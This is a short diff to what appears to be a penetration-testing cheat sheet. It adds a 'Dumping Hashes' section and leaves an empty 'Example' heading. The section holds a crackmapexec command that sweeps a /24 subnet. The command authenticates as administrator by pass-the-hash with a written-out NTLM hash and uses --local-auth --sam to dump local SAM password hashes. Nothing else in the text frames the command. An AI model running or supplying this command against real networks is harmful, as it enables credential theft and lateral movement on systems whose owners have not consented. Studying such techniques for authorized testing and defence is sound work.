@@ -28,3 +28,16 @@ $ sudo crackmapexec smb 192.168.0.0/24 -u administrator -H aad3b435b51404eeaad3b
 
 
 
+## **Dumping Hashes**
+
+```powershell
+# dump SAM hashes of local admin and users
+
+$ sudo crackmapexec smb 192.168.0.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
+```
+
+
+
+### **Example**
+
+
